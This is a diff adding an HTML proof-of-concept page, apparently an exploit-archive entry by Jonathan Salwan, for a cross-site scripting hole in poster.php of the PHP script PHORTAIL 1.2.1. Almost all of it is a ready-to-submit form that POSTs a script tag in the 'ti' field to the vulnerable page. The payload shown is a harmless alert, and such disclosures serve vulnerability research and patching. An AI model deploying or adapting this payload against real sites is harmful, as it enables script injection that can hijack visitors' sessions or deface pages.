@@ -1,0 +1,20 @@
+&lt;html&gt;&lt;head&gt;&lt;title&gt;PHORTAIL v1.2.1 XSS Vulnerability&lt;/title&gt;&lt;/head&gt;
+&lt;hr&gt;&lt;pre&gt;
+Module   : PHORTAIL 1.2.1
+download : http://www.phpscripts-fr.net/scripts/download.php?id=330
+Vul      : XSS Vulnerability
+file     : poster.php
+Author   : Jonathan Salwan
+Mail     : submit [AT] shell-storm.org
+Web      : http://www.shell-storm.org
+&lt;/pre&gt;&lt;hr&gt;
+
+&lt;form name=&quot;rapporter&quot; action=&quot;http://www.example.com/poster.php&quot; method=&quot;POST&quot;&gt;&lt;/br&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;ajn&quot; value=&quot;1&quot;&gt;
+	&lt;input type=&quot;text&quot; name=&quot;pseudo&quot; value=&quot;xss&quot;&gt;=&gt;Pseudo&lt;/br&gt;
+	&lt;input type=&quot;text&quot; name=&quot;email&quot;  value=&quot;xss@xss.com&quot;&gt;=&gt;E-mail&lt;/br&gt;
+	&lt;input type=&quot;text&quot; name=&quot;ti&quot;     value=&quot;&lt;script&gt;alert(&#039;xss PoC&#039;);&lt;/script&gt;&quot;&gt;=&gt;XSS vulnerability&lt;/br&gt;
+	&lt;input type=&quot;text&quot; name=&quot;txt&quot;    value=&quot;xss&quot;&gt;=&gt;text&lt;/br&gt;
+	&lt;input type=&quot;submit&quot; value=&quot;Start&quot;&gt;&lt;/br&gt;
+&lt;/form&gt;
+&lt;/html&gt;
